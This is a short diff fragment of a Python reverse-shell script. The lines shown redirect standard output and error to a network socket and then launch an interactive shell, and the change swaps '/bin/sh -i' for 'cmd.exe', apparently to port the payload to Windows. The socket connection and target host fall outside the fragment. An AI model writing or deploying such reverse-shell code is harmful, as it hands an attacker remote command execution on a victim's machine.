@@ -15,4 +15,4 @@ os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 
 # Start a shell
-subprocess.call(["/bin/sh", "-i"])
+subprocess.call(["cmd.exe"])
